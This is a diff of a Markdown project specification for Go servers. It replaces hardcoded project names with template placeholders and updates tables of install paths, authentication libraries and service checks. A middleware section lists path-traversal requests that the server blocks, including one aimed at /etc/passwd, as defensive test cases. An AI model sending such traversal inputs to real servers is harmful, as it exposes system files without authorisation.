 | `weather` | Project name (inferred from path) | `jokes` |
 | `apimgr` | Organization name (inferred from path) | `apimgr` |
-| `{gitprovider}` | Git hosting provider | `github`, `gitlab`, `private` |
+| `{git_provider}` | Git hosting provider | `github`, `gitlab`, `private` |
 | **Rule** | Anything in `{}` is a variable | |
 | **Rule** | Anything NOT in `{}` is literal | `/etc/letsencrypt/live` is a real path |
 
@@ -5340,38 +5640,38 @@ package main
 
 **NEVER hardcode `weather` or `apimgr` - always infer from git remote or directory path.**
 
-**Recommended path structure:** `~/Projects/{gitprovider}/apimgr/weather` (but works with any location)
+**Recommended path structure:** `~/Projects/{git_provider}/apimgr/{internal_name}` (but works with any location)
 
 ```bash
 # Method 1: Infer from git remote (PREFERRED - works regardless of directory location)
-# github.com/cloudops/echoip.git → PROJECTORG=cloudops, PROJECTNAME=echoip
-PROJECTNAME=$(git remote get-url origin 2>/dev/null | sed -E 's|.*/([^/]+)(\.git)?$|\1|')
-PROJECTORG=$(git remote get-url origin 2>/dev/null | sed -E 's|.*/([^/]+)/[^/]+(\.git)?$|\1|')
+# github.com/cloudops/echoip.git → PROJECT_ORG=cloudops, PROJECT_NAME=echoip
+PROJECT_NAME=$(git remote get-url origin 2>/dev/null | sed -E 's|.*/([^/]+)(\.git)?$|\1|')
+PROJECT_ORG=$(git remote get-url origin 2>/dev/null | sed -E 's|.*/([^/]+)/[^/]+(\.git)?$|\1|')
 
 # Method 2: Infer from current directory path (fallback if no git remote)
 # Works with any path structure: ~/Documents/myproject, ~/myproject, etc.
-PROJECTNAME=$(basename "$PWD")                    # myproject
-PROJECTORG=$(basename "$(dirname "$PWD")")        # Documents (or parent dir name)
+PROJECT_NAME=$(basename "$PWD")                    # myproject
+PROJECT_ORG=$(basename "$(dirname "$PWD")")        # Documents (or parent dir name)
 
 # Method 3: Combined approach (git first, fallback to path)
-PROJECTNAME=$(git remote get-url origin 2>/dev/null | sed -E 's|.*/([^/]+)(\.git)?$|\1|' || basename "$PWD")
-PROJECTORG=$(git remote get-url origin 2>/dev/null | sed -E 's|.*/([^/]+)/[^/]+(\.git)?$|\1|' || basename "$(dirname "$PWD")")
+PROJECT_NAME=$(git remote get-url origin 2>/dev/null | sed -E 's|.*/([^/]+)(\.git)?$|\1|' || basename "$PWD")
+PROJECT_ORG=$(git remote get-url origin 2>/dev/null | sed -E 's|.*/([^/]+)/[^/]+(\.git)?$|\1|' || basename "$(dirname "$PWD")")
 ```
 
-**Note:** When using path-based inference, `PROJECTORG` will be the parent directory name, which may not match the git organization unless you follow the recommended `~/Projects/{gitprovider}/apimgr/weather` structure. Git remote inference is always more reliable.
+**Note:** When using path-based inference, `PROJECT_ORG` will be the parent directory name, which may not match the git organization unless you follow the recommended `~/Projects/{git_provider}/apimgr/{internal_name}` structure. Git remote inference is always more reliable.
 
 ### Variable Capitalization
 
 | Format | Use Case | Example |
 |--------|----------|---------|
 | `weather` | Lowercase (filenames, paths, commands) | `jokes`, `/etc/apimgr/jokes/` |
-| `weather` | camelCase (Go variables, JSON keys) | `projectName := "jokes"` |
-| `Weather` | PascalCase (Go types, display names) | `type JokesServer struct` |
-| `WEATHER` | UPPERCASE (env vars, Makefile vars) | `PROJECTNAME=jokes` |
+| `{projectName}` | camelCase (Go variables, JSON keys) | `projectName := "jokes"` |
+| `{Projectname}` | PascalCase (Go types, display names) | `type JokesServer struct` |
+| `WEATHER` | UPPERCASE (env vars, Makefile vars) | `PROJECT_NAME=jokes` |
 
 **Examples (assuming no git remote, inferred from path):**
 
-| Path | `PROJECTORG` | `PROJECTNAME` | Notes |
+| Path | `PROJECT_ORG` | `PROJECT_NAME` | Notes |
 |------|--------------|---------------|-------|
 | `~/Projects/github/cloudops/echoip` | `cloudops` | `echoip` | Recommended structure |
 | `~/Projects/gitlab/casapps/cassearch` | `casapps` | `cassearch` | Recommended structure |
@@ -5385,12 +5685,12 @@ PROJECTORG=$(git remote get-url origin 2>/dev/null | sed -E 's|.*/([^/]+)/[^/]+(
 
 **IMPORTANT: Project root can be located ANYWHERE on your system. This section describes a RECOMMENDED organizational structure, not a requirement.**
 
-**Recommended Format:** `~/Projects/{gitprovider}/apimgr/weather`
+**Recommended Format:** `~/Projects/{git_provider}/apimgr/{internal_name}`
 
 | Component | Description | Examples |
 |-----------|-------------|----------|
 | `~/Projects/` | Base projects directory (recommended) | Can be `~/Projects/`, `~/Documents/`, `/opt/`, etc. |
-| `{gitprovider}` | Git hosting provider or `local` | `github`, `gitlab`, `bitbucket`, `private`, `local` |
+| `{git_provider}` | Git hosting provider or `local` | `github`, `gitlab`, `bitbucket`, `private`, `local` |
 | `apimgr` | Organization/username (inferred) | `apimgr`, `casjay`, `myorg` |
 | `weather` | Project name (inferred) | `jokes`, `icons`, `myproject` |
 
@@ -5413,7 +5713,7 @@ PROJECTORG=$(git remote get-url origin 2>/dev/null | sed -E 's|.*/([^/]+)/[^/]+(
 
 ### Special: `local` Provider
 
-`~/Projects/local/apimgr/weather` (or any other location) is used for:
+`~/Projects/local/apimgr/{internal_name}` (or any other location) is used for:
 - **Prototyping** - Quick experiments and proof-of-concept
 - **Bootstrapping** - Initial project setup before pushing to VCS
 - **Local-only development** - Projects not intended for remote hosting
@@ -5867,7 +6167,7 @@ cd /path/to/project && docker build -f docker/Dockerfile .
 
 **go.mod Example:**
 ```
-module github.com/apimgr/weather
+module github.com/apimgr/{internal_name}
 
 go 1.xx  // Use current latest stable version
 
@@ -5905,8 +6205,8 @@ require (
 | Purpose | Library | Notes |
 |---------|---------|-------|
 | **YAML** | `gopkg.in/yaml.v3` | Config file parsing |
-| **UUID** | `github.com/google/uuid` | Standard UUID generation |
-| **Argon2** | `golang.org/x/crypto/argon2` | Password hashing |
+| **UUID** | `github.com/google/uuid` (≥ v1.6 for v7 support) | RFC 9562 UUIDs (v4 + v7) |
+| **Argon2** | `golang.org/x/crypto/argon2` | Password hashing — RFC 9106 |
 | **Bcrypt** | `golang.org/x/crypto/bcrypt` | Verify existing passwords (rehash to Argon2id) |
 
 ### Authentication (REQUIRED - ALL PROJECTS)
@@ -5914,15 +6214,24 @@ require (
 **Every project has Server Admins, even apps without users (e.g., `jokes` loading JSON).**
 **These libraries are REQUIRED to support admin authentication features.**
 
-| Purpose | Library | Notes |
-|---------|---------|-------|
-| **TOTP** | `github.com/pquerna/otp` | Time-based 2FA codes |
-| **Passkeys/WebAuthn** | `github.com/go-webauthn/webauthn` | FIDO2/WebAuthn passwordless |
-| **JWT** | `github.com/golang-jwt/jwt/v5` | API token authentication |
-| **OIDC** | `github.com/coreos/go-oidc/v3` | OpenID Connect client |
-| **OAuth2** | `golang.org/x/oauth2` | OAuth2 flows |
-| **LDAP** | `github.com/go-ldap/ldap/v3` | LDAP/Active Directory |
-| **Sessions** | `github.com/gorilla/sessions` | Cookie-based sessions |
+| Purpose | Library | Standard / RFC |
+|---------|---------|----------------|
+| **TOTP** | `github.com/pquerna/otp` | RFC 6238 (TOTP), RFC 4226 (HOTP) |
+| **Passkeys/WebAuthn** | `github.com/go-webauthn/webauthn` | W3C WebAuthn Level 3, FIDO2 |
+| **JWT** | `github.com/golang-jwt/jwt/v5` | RFC 7519 (JWT), RFC 7515 (JWS), RFC 7518 (JWA) |
+| **OIDC** | `github.com/coreos/go-oidc/v3` | OpenID Connect Core 1.0 |
+| **OAuth2** | `golang.org/x/oauth2` | RFC 6749 (OAuth2 Framework), RFC 6750 (Bearer), RFC 7636 (PKCE) |
+| **LDAP** | `github.com/go-ldap/ldap/v3` | RFC 4510-4519 (LDAPv3) |
+| **Sessions** | `github.com/gorilla/sessions` | RFC 6265bis (SameSite, Secure cookies) |
+| **WebSocket** (if used) | `nhooyr.io/websocket` or `github.com/gorilla/websocket` | RFC 6455 |
+| **Web Linking** (pagination) | stdlib `net/http` `Link:` header | RFC 8288 |
+| **Problem Details** (RFC 7807) | stdlib + middleware (no external lib) | RFC 7807 (Accept-negotiated, see PART 16) |
+| **Health response** | stdlib + middleware | `application/health+json` (draft-inadarei-api-health-check), see PART 13 |
+| **mailto: URL** | stdlib `net/mail` | RFC 6068 (mailto:), RFC 5322 (Internet Message Format) |
+| **CIDR / IP allowlist** | stdlib `net` `ParseCIDR` | RFC 4632 (CIDR), RFC 4291 (IPv6) |
+| **robots.txt** | built-in template | RFC 9309 (Robots Exclusion Protocol) |
+| **OpenAPI** | `github.com/swaggo/swag` (annotations) → OpenAPI 3.1 spec generated by `src/swagger/swagger.go` | OpenAPI Specification 3.1.x — pin via `// @openapi 3.1.0` in the Go annotation header processed by `swag init` (no static `swagger.yaml` file — `openapi.json` is the only emitted artifact, served at `/api/{api_version}/openapi.json`) |
+| **GraphQL** | `github.com/99designs/gqlgen` | GraphQL October 2021 spec — pin via a header comment in the resolver-generated schema (`src/graphql/schema.go`) |
 
 **Server Admin MFA (Recommended):**
 - TOTP and Passkeys are optional but STRONGLY recommended for Server Admins
@@ -6109,7 +6418,7 @@ require github.com/tursodatabase/libsql-client-go v0.0.0-20240902231107-85af5b9d
 ### Example go.mod
 
 ```go
-module github.com/apimgr/weather
+module github.com/apimgr/{internal_name}
 
 go 1.xx  // Use current latest stable version
 
@@ -6172,7 +6481,7 @@ require (
 | **Library** | `golang.org/x/crypto/argon2` | Pure Go, CGO_ENABLED=0 compatible |
 | **Fallback** | Bcrypt (cost 12+) | Verify existing passwords, then rehash with Argon2id |
 
-### Argon2id Parameters (OWASP 2023)
+### Argon2id Parameters (RFC 9106 — OWASP 2023 second-recommended profile)
 
 ```go
 import "golang.org/x/crypto/argon2"
@@ -6272,35 +6581,35 @@ Before proceeding, confirm you understand:
 | Type | Path |
 |------|------|
 | Binary | `/usr/local/bin/weather` |
-| Config | `/etc/apimgr/weather/` |
-| Config File | `/etc/apimgr/weather/server.yml` |
-| Data | `/var/lib/apimgr/weather/` |
-| Cache | `/var/cache/apimgr/weather/` |
-| Logs | `/var/log/apimgr/weather/` |
-| Log File | `/var/log/apimgr/weather/server.log` |
-| Backup | `/mnt/Backups/apimgr/weather/` |
-| PID File | `/var/run/apimgr/weather.pid` |
-| SSL | `/etc/apimgr/weather/ssl/` (letsencrypt/, local/) |
-| Security | `/var/lib/apimgr/weather/security/` (geoip/, blocklists/, cve/, trivy/) |
-| SQLite DB | `/var/lib/apimgr/weather/db/` (server.db, users.db) |
-| Service | `/etc/systemd/system/weather.service` |
+| Config | `/etc/apimgr/{internal_name}/` |
+| Config File | `/etc/apimgr/{internal_name}/server.yml` |
+| Data | `/var/lib/apimgr/{internal_name}/` |
+| Cache | `/var/cache/apimgr/{internal_name}/` |
+| Logs | `/var/log/apimgr/{internal_name}/` |
+| Log File | `/var/log/apimgr/{internal_name}/server.log` |
+| Backup | `/mnt/Backups/apimgr/{internal_name}/` |
+| PID File | `/var/run/apimgr/{internal_name}.pid` |
+| SSL | `/etc/apimgr/{internal_name}/ssl/` (letsencrypt/, local/) |
+| Security | `/var/lib/apimgr/{internal_name}/security/` (geoip/, blocklists/, cve/, trivy/) |
+| SQLite DB | `/var/lib/apimgr/{internal_name}/db/` (server.db, users.db) |
+| Service | `/etc/systemd/system/{internal_name}.service` |
 
 ### User (non-privileged)
 
 | Type | Path |
 |------|------|
 | Binary | `~/.local/bin/weather` |
-| Config | `~/.config/apimgr/weather/` |
-| Config File | `~/.config/apimgr/weather/server.yml` |
-| Data | `~/.local/share/apimgr/weather/` |
-| Cache | `~/.cache/apimgr/weather/` |
-| Logs | `~/.local/log/apimgr/weather/` |
-| Log File | `~/.local/log/apimgr/weather/server.log` |
-| Backup | `~/.local/share/Backups/apimgr/weather/` |
-| PID File | `~/.local/share/apimgr/weather/weather.pid` |
-| SSL | `~/.config/apimgr/weather/ssl/` (letsencrypt/, local/) |
-| Security | `~/.local/share/apimgr/weather/security/` (geoip/, blocklists/, cve/, trivy/) |
-| SQLite DB | `~/.local/share/apimgr/weather/db/` (server.db, users.db) |
+| Config | `~/.config/apimgr/{internal_name}/` |
+| Config File | `~/.config/apimgr/{internal_name}/server.yml` |
+| Data | `~/.local/share/apimgr/{internal_name}/` |
+| Cache | `~/.cache/apimgr/{internal_name}/` |
+| Logs | `~/.local/log/apimgr/{internal_name}/` |
+| Log File | `~/.local/log/apimgr/{internal_name}/server.log` |
+| Backup | `~/.local/share/Backups/apimgr/{internal_name}/` |
+| PID File | `~/.local/share/apimgr/{internal_name}/{internal_name}.pid` |
+| SSL | `~/.config/apimgr/{internal_name}/ssl/` (letsencrypt/, local/) |
+| Security | `~/.local/share/apimgr/{internal_name}/security/` (geoip/, blocklists/, cve/, trivy/) |
+| SQLite DB | `~/.local/share/apimgr/{internal_name}/db/` (server.db, users.db) |
 
 ---
 
@@ -6311,36 +6620,36 @@ Before proceeding, confirm you understand:
 | Type | Path |
 |------|------|
 | Binary | `/usr/local/bin/weather` |
-| Config | `/Library/Application Support/apimgr/weather/` |
-| Config File | `/Library/Application Support/apimgr/weather/server.yml` |
-| Data | `/Library/Application Support/apimgr/weather/data/` |
-| Cache | `/Library/Caches/apimgr/weather/` |
-| Logs | `/Library/Logs/apimgr/weather/` |
-| Log File | `/Library/Logs/apimgr/weather/server.log` |
-| Backup | `/Library/Backups/apimgr/weather/` |
-| PID File | `/var/run/apimgr/weather.pid` |
-| SSL | `/Library/Application Support/apimgr/weather/ssl/` (letsencrypt/, local/) |
-| Security | `/Library/Application Support/apimgr/weather/data/security/` (geoip/, blocklists/, cve/, trivy/) |
-| SQLite DB | `/Library/Application Support/apimgr/weather/db/` (server.db, users.db) |
-| Service | `/Library/LaunchDaemons/com.apimgr.weather.plist` |
+| Config | `/Library/Application Support/apimgr/{internal_name}/` |
+| Config File | `/Library/Application Support/apimgr/{internal_name}/server.yml` |
+| Data | `/Library/Application Support/apimgr/{internal_name}/data/` |
+| Cache | `/Library/Caches/apimgr/{internal_name}/` |
+| Logs | `/Library/Logs/apimgr/{internal_name}/` |
+| Log File | `/Library/Logs/apimgr/{internal_name}/server.log` |
+| Backup | `/Library/Backups/apimgr/{internal_name}/` |
+| PID File | `/var/run/apimgr/{internal_name}.pid` |
+| SSL | `/Library/Application Support/apimgr/{internal_name}/ssl/` (letsencrypt/, local/) |
+| Security | `/Library/Application Support/apimgr/{internal_name}/data/security/` (geoip/, blocklists/, cve/, trivy/) |
+| SQLite DB | `/Library/Application Support/apimgr/{internal_name}/db/` (server.db, users.db) |
+| Service | `/Library/LaunchDaemons/{plist_label}.plist` |
 
 ### User (non-privileged)
 
 | Type | Path |
 |------|------|
 | Binary | `~/bin/weather` or `/usr/local/bin/weather` |
-| Config | `~/Library/Application Support/apimgr/weather/` |
-| Config File | `~/Library/Application Support/apimgr/weather/server.yml` |
-| Data | `~/Library/Application Support/apimgr/weather/` |
-| Cache | `~/Library/Caches/apimgr/weather/` |
-| Logs | `~/Library/Logs/apimgr/weather/` |
-| Log File | `~/Library/Logs/apimgr/weather/server.log` |
-| Backup | `~/Library/Backups/apimgr/weather/` |
-| PID File | `~/Library/Application Support/apimgr/weather/weather.pid` |
-| SSL | `~/Library/Application Support/apimgr/weather/ssl/` (letsencrypt/, local/) |
-| Security | `~/Library/Application Support/apimgr/weather/data/security/` (geoip/, blocklists/, cve/, trivy/) |
-| SQLite DB | `~/Library/Application Support/apimgr/weather/db/` (server.db, users.db) |
-| Service | `~/Library/LaunchAgents/com.apimgr.weather.plist` |
+| Config | `~/Library/Application Support/apimgr/{internal_name}/` |
+| Config File | `~/Library/Application Support/apimgr/{internal_name}/server.yml` |
+| Data | `~/Library/Application Support/apimgr/{internal_name}/` |
+| Cache | `~/Library/Caches/apimgr/{internal_name}/` |
+| Logs | `~/Library/Logs/apimgr/{internal_name}/` |
+| Log File | `~/Library/Logs/apimgr/{internal_name}/server.log` |
+| Backup | `~/Library/Backups/apimgr/{internal_name}/` |
+| PID File | `~/Library/Application Support/apimgr/{internal_name}/{internal_name}.pid` |
+| SSL | `~/Library/Application Support/apimgr/{internal_name}/ssl/` (letsencrypt/, local/) |
+| Security | `~/Library/Application Support/apimgr/{internal_name}/data/security/` (geoip/, blocklists/, cve/, trivy/) |
+| SQLite DB | `~/Library/Application Support/apimgr/{internal_name}/db/` (server.db, users.db) |
+| Service | `~/Library/LaunchAgents/{plist_label}.plist` |
 
 ---
 
@@ -6351,35 +6660,35 @@ Before proceeding, confirm you understand:
 | Type | Path |
 |------|------|
 | Binary | `/usr/local/bin/weather` |
-| Config | `/usr/local/etc/apimgr/weather/` |
-| Config File | `/usr/local/etc/apimgr/weather/server.yml` |
-| Data | `/var/db/apimgr/weather/` |
-| Cache | `/var/cache/apimgr/weather/` |
-| Logs | `/var/log/apimgr/weather/` |
-| Log File | `/var/log/apimgr/weather/server.log` |
-| Backup | `/var/backups/apimgr/weather/` |
-| PID File | `/var/run/apimgr/weather.pid` |
-| SSL | `/usr/local/etc/apimgr/weather/ssl/` (letsencrypt/, local/) |
-| Security | `/var/db/apimgr/weather/security/` (geoip/, blocklists/, cve/, trivy/) |
-| SQLite DB | `/var/db/apimgr/weather/db/` (server.db, users.db) |
-| Service | `/usr/local/etc/rc.d/weather` |
+| Config | `/usr/local/etc/apimgr/{internal_name}/` |
+| Config File | `/usr/local/etc/apimgr/{internal_name}/server.yml` |
+| Data | `/var/db/apimgr/{internal_name}/` |
+| Cache | `/var/cache/apimgr/{internal_name}/` |
+| Logs | `/var/log/apimgr/{internal_name}/` |
+| Log File | `/var/log/apimgr/{internal_name}/server.log` |
+| Backup | `/var/backups/apimgr/{internal_name}/` |
+| PID File | `/var/run/apimgr/{internal_name}.pid` |
+| SSL | `/usr/local/etc/apimgr/{internal_name}/ssl/` (letsencrypt/, local/) |
+| Security | `/var/db/apimgr/{internal_name}/security/` (geoip/, blocklists/, cve/, trivy/) |
+| SQLite DB | `/var/db/apimgr/{internal_name}/db/` (server.db, users.db) |
+| Service | `/usr/local/etc/rc.d/{internal_name}` |
 
 ### User (non-privileged)
 
 | Type | Path |
 |------|------|
 | Binary | `~/.local/bin/weather` |
-| Config | `~/.config/apimgr/weather/` |
-| Config File | `~/.config/apimgr/weather/server.yml` |
-| Data | `~/.local/share/apimgr/weather/` |
-| Cache | `~/.cache/apimgr/weather/` |
-| Logs | `~/.local/log/apimgr/weather/` |
-| Log File | `~/.local/log/apimgr/weather/server.log` |
-| Backup | `~/.local/share/Backups/apimgr/weather/` |
-| PID File | `~/.local/share/apimgr/weather/weather.pid` |
-| SSL | `~/.config/apimgr/weather/ssl/` (letsencrypt/, local/) |
-| Security | `~/.local/share/apimgr/weather/security/` (geoip/, blocklists/, cve/, trivy/) |
-| SQLite DB | `~/.local/share/apimgr/weather/db/` (server.db, users.db) |
+| Config | `~/.config/apimgr/{internal_name}/` |
+| Config File | `~/.config/apimgr/{internal_name}/server.yml` |
+| Data | `~/.local/share/apimgr/{internal_name}/` |
+| Cache | `~/.cache/apimgr/{internal_name}/` |
+| Logs | `~/.local/log/apimgr/{internal_name}/` |
+| Log File | `~/.local/log/apimgr/{internal_name}/server.log` |
+| Backup | `~/.local/share/Backups/apimgr/{internal_name}/` |
+| PID File | `~/.local/share/apimgr/{internal_name}/{internal_name}.pid` |
+| SSL | `~/.config/apimgr/{internal_name}/ssl/` (letsencrypt/, local/) |
+| Security | `~/.local/share/apimgr/{internal_name}/security/` (geoip/, blocklists/, cve/, trivy/) |
+| SQLite DB | `~/.local/share/apimgr/{internal_name}/db/` (server.db, users.db) |
 
 ---
 
@@ -6389,34 +6698,34 @@ Before proceeding, confirm you understand:
 
 | Type | Path |
 |------|------|
-| Binary | `C:\Program Files\apimgr\weather\weather.exe` |
-| Config | `%ProgramData%\apimgr\weather\` |
-| Config File | `%ProgramData%\apimgr\weather\server.yml` |
-| Data | `%ProgramData%\apimgr\weather\data\` |
-| Cache | `%ProgramData%\apimgr\weather\cache\` |
-| Logs | `%ProgramData%\apimgr\weather\logs\` |
-| Log File | `%ProgramData%\apimgr\weather\logs\server.log` |
-| Backup | `%ProgramData%\Backups\apimgr\weather\` |
-| SSL | `%ProgramData%\apimgr\weather\ssl\` (letsencrypt\, local\) |
-| Security | `%ProgramData%\apimgr\weather\data\security\` (geoip\, blocklists\, cve\, trivy\) |
-| SQLite DB | `%ProgramData%\apimgr\weather\db\` (server.db, users.db) |
+| Binary | `C:\Program Files\apimgr\{internal_name}\weather.exe` |
+| Config | `%ProgramData%\apimgr\{internal_name}\` |
+| Config File | `%ProgramData%\apimgr\{internal_name}\server.yml` |
+| Data | `%ProgramData%\apimgr\{internal_name}\data\` |
+| Cache | `%ProgramData%\apimgr\{internal_name}\cache\` |
+| Logs | `%ProgramData%\apimgr\{internal_name}\logs\` |
+| Log File | `%ProgramData%\apimgr\{internal_name}\logs\server.log` |
+| Backup | `%ProgramData%\Backups\apimgr\{internal_name}\` |
+| SSL | `%ProgramData%\apimgr\{internal_name}\ssl\` (letsencrypt\, local\) |
+| Security | `%ProgramData%\apimgr\{internal_name}\data\security\` (geoip\, blocklists\, cve\, trivy\) |
+| SQLite DB | `%ProgramData%\apimgr\{internal_name}\db\` (server.db, users.db) |
 | Service | Windows Service Manager |
 
 ### User (non-privileged)
 
 | Type | Path |
 |------|------|
-| Binary | `%LocalAppData%\apimgr\weather\weather.exe` |
-| Config | `%AppData%\apimgr\weather\` |
-| Config File | `%AppData%\apimgr\weather\server.yml` |
-| Data | `%LocalAppData%\apimgr\weather\` |
-| Cache | `%LocalAppData%\apimgr\weather\cache\` |
-| Logs | `%LocalAppData%\apimgr\weather\logs\` |
-| Log File | `%LocalAppData%\apimgr\weather\logs\server.log` |
-| Backup | `%LocalAppData%\Backups\apimgr\weather\` |
-| SSL | `%AppData%\apimgr\weather\ssl\` (letsencrypt\, local\) |
-| Security | `%LocalAppData%\apimgr\weather\security\` (geoip\, blocklists\, cve\, trivy\) |
-| SQLite DB | `%LocalAppData%\apimgr\weather\db\` (server.db, users.db) |
+| Binary | `%LocalAppData%\apimgr\{internal_name}\weather.exe` |
+| Config | `%AppData%\apimgr\{internal_name}\` |
+| Config File | `%AppData%\apimgr\{internal_name}\server.yml` |
+| Data | `%LocalAppData%\apimgr\{internal_name}\` |
+| Cache | `%LocalAppData%\apimgr\{internal_name}\cache\` |
+| Logs | `%LocalAppData%\apimgr\{internal_name}\logs\` |
+| Log File | `%LocalAppData%\apimgr\{internal_name}\logs\server.log` |
+| Backup | `%LocalAppData%\Backups\apimgr\{internal_name}\` |
+| SSL | `%AppData%\apimgr\{internal_name}\ssl\` (letsencrypt\, local\) |
+| Security | `%LocalAppData%\apimgr\{internal_name}\security\` (geoip\, blocklists\, cve\, trivy\) |
+| SQLite DB | `%LocalAppData%\apimgr\{internal_name}\db\` (server.db, users.db) |
 
 ---
 
@@ -6427,15 +6736,15 @@ Before proceeding, confirm you understand:
 | Type | Path |
 |------|------|
 | Binary | `/usr/local/bin/weather` |
-| Config | `/config/weather/` |
-| Config File | `/config/weather/server.yml` |
-| Security DBs | `/data/weather/security/` (geoip, blocklists, cve, trivy) |
-| Data | `/data/weather/` |
-| Cache | `/data/weather/cache/` |
-| Logs | `/data/log/weather/` |
-| Log File | `/data/log/weather/server.log` |
+| Config | `/config/{internal_name}/` |
+| Config File | `/config/{internal_name}/server.yml` |
+| Security DBs | `/data/{internal_name}/security/` (geoip, blocklists, cve, trivy) |
+| Data | `/data/{internal_name}/` |
+| Cache | `/data/{internal_name}/cache/` |
+| Logs | `/data/log/{internal_name}/` |
+| Log File | `/data/log/{internal_name}/server.log` |
 | SQLite DB | `/data/db/sqlite/` (server.db, users.db) |
-| Backup | `/data/backups/weather/` |
+| Backup | `/data/backups/{internal_name}/` |
 | Internal Port | `80` |
 
 **Docker volume mounts map host paths to container paths:**
@@ -6701,11 +7010,11 @@ func PathSecurityMiddleware(next http.Handler) http.Handler {
 
 | Request | Result | Status |
 |---------|--------|--------|
-| `GET /admin//dashboard` | `/admin/dashboard` | 200 |
-| `GET //api///v1//users` | `/api/v1/users` | 200 |
+| `GET /admin//dashboard` | `/{admin_path}/dashboard` | 200 |
+| `GET //api///v1//users` | `/api/{api_version}/users` | 200 |
 | `GET ///` | `/` | 200 |
 | `GET /static/../admin` | Blocked | 400 |
-| `GET /api/v1/files/..%2F..%2Fetc/passwd` | Blocked | 400 |
+| `GET /api/{api_version}/files/..%2F..%2Fetc/passwd` | Blocked | 400 |
 | `GET /admin/....//secret` | Blocked | 400 |
 
 ### File Path Security
@@ -6963,7 +7272,7 @@ Self-Healing Successful?                        │
 
 **The admin panel remains accessible and provides guidance for fixing issues.**
 
-#### Maintenance Dashboard (`/admin`)
+#### Maintenance Dashboard (`/{admin_path}`)
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
@@ -7046,15 +7355,18 @@ Self-Healing Successful?                        │
 
 ```json
 {
-  "error": "Service in maintenance mode",
-  "code": "MAINTENANCE_MODE",
-  "status": 503,
+  "ok": false,
+  "error": "MAINTENANCE_MODE",
   "message": "Server is in maintenance mode due to: Database connection failed",
-  "reason": "database_connection",
-  "self_healing": true,
-  "retry_after": 30
+  "details": {
+    "reason": "database_connection",
+    "self_healing": true,
+    "retry_after_seconds": 30
+  }
 }
 ```
+
+**HTTP status:** `503 Service Unavailable` (carries the status — do NOT duplicate inside the body).
 
 **Headers:**
 ```
@@ -7459,14 +7771,14 @@ func (req *CreateUserRequest) Parse() (*User, error) {
 | `SMTP_USERNAME` | SMTP authentication username |
 | `SMTP_PASSWORD` | SMTP authentication password |
 | `SMTP_FROM_NAME` | Sender name (default: app title) |
-| `SMTP_FROM_EMAIL` | Sender email (default: `no-reply@wthr.top`) |
+| `SMTP_FROM_EMAIL` | Sender email (default: `no-reply@{fqdn}`) |
 | `SMTP_TLS` | TLS mode: `auto`, `starttls`, `tls`, `none` (default: `auto`) |
 
 **URL Variable Resolution (Reverse Proxy Preferred):**
-- `wthr.top`: Reverse Proxy Headers → `DOMAIN` → `os.Hostname()` → `$HOSTNAME` → Global IP → `localhost`
+- `{fqdn}`: Reverse Proxy Headers → `DOMAIN` → `os.Hostname()` → `$HOSTNAME` → Global IP → `localhost`
 - `{proto}`: `X-Forwarded-Proto` → `X-Forwarded-Ssl` → TLS detection → `http`
 - `{port}`: `X-Forwarded-Port` → Host header → Server port → Proto default
-- `/`: `X-Forwarded-Prefix` → `X-Forwarded-Path` → `X-Script-Name` → `server.baseurl` → `/`
+- `{base_url}`: `X-Forwarded-Prefix` → `X-Forwarded-Path` → `X-Script-Name` → `server.baseurl` → `/`
 
 **Note:** Loopback addresses avoided; global IPs preferred. See PART 5 for full details.
 
@@ -7504,8 +7816,8 @@ func (req *CreateUserRequest) Parse() (*User, error) {
 
 | User Type | Path |
 |-----------|------|
-| Root | `/etc/apimgr/weather/server.yml` |
-| Regular | `~/.config/apimgr/weather/server.yml` |
+| Root | `/etc/apimgr/{internal_name}/server.yml` |
+| Regular | `~/.config/apimgr/{internal_name}/server.yml` |
 
 ### Migration
 
@@ -7567,7 +7879,7 @@ sudo weather --service install
 
 # Windows (run as Administrator)
 weather.exe --service install
-# Binary creates Windows service with Virtual Service Account (NT SERVICE\weather)
+# Binary creates Windows service with Virtual Service Account (NT SERVICE\{internal_name})
 ```
 
 #### Unix-Like Platforms (Linux, macOS, FreeBSD)
@@ -7608,10 +7920,10 @@ ENTRYPOINT [ "tini", "-p", "SIGTERM", "--", "/usr/local/bin/entrypoint.sh" ]
 
 | Step | Running As | Actions |
 |------|-----------|---------|
-| 1 | **NT SERVICE\\weather** | Service manager starts binary |
-| 2 | **NT SERVICE\\weather** | Create directories (has access via ACL) |
-| 3 | **NT SERVICE\\weather** | Bind configured ports |
-| 4 | **NT SERVICE\\weather** | Initialize and serve requests |
+| 1 | **NT SERVICE\\{internal_name}** | Service manager starts binary |
+| 2 | **NT SERVICE\\{internal_name}** | Create directories (has access via ACL) |
+| 3 | **NT SERVICE\\{internal_name}** | Bind configured ports |
+| 4 | **NT SERVICE\\{internal_name}** | Initialize and serve requests |
 
 **Note:** VSA is auto-created by Windows when service is installed. No manual user creation needed.
 
@@ -7952,10 +8264,12 @@ func needsEscalationForService() bool {
         // Windows: check if service is registered
         return !isElevated() && isWindowsServiceInstalled()
     }
-    // Unix: check for system service files
-    if fileExists("/etc/systemd/system/weather.service") ||
-       fileExists("/Library/LaunchDaemons/apimgr.weather.plist") ||
-       fileExists("/usr/local/etc/rc.d/weather") {
+    // Unix: check for system service files (cover all supported init systems)
+    if fileExists("/etc/systemd/system/{internal_name}.service") ||                       // systemd (most Linux)
+       fileExists("/Library/LaunchDaemons/{plist_label}.plist") ||    // launchd (macOS)
+       fileExists("/usr/local/etc/rc.d/{internal_name}") ||                               // rc.d (FreeBSD)
+       fileExists("/etc/init.d/{internal_name}") ||                                       // OpenRC / SysVinit (script content distinguishes)
+       fileExists("/etc/sv/{internal_name}/run") {                                        // runit
         // System service installed - need elevated privileges to manage
         return !isElevated()
     }
@@ -8079,7 +8393,7 @@ Binary checks:
 | **Username** | `weather` |
 | **Group** | `weather` |
 | **Shell** | `/usr/sbin/nologin` (no login) |
-| **Home** | `/var/lib/apimgr/weather` |
+| **Home** | `/var/lib/apimgr/{internal_name}` |
 | **UID/GID** | Auto-assigned by system |
 | **Type** | System user (UID < 1000 on Linux) |
 
@@ -8087,11 +8401,11 @@ Binary checks:
 
 | Permission | Details |
 |------------|---------|
-| Read/write config | `/etc/apimgr/weather/` |
-| Read/write data | `/var/lib/apimgr/weather/` |
-| Read/write cache | `/var/cache/apimgr/weather/` |
-| Read/write logs | `/var/log/apimgr/weather/` |
-| Read/write backups | `/var/lib/Backups/apimgr/weather/` or `/mnt/Backups/...` |
+| Read/write config | `/etc/apimgr/{internal_name}/` |
+| Read/write data | `/var/lib/apimgr/{internal_name}/` |
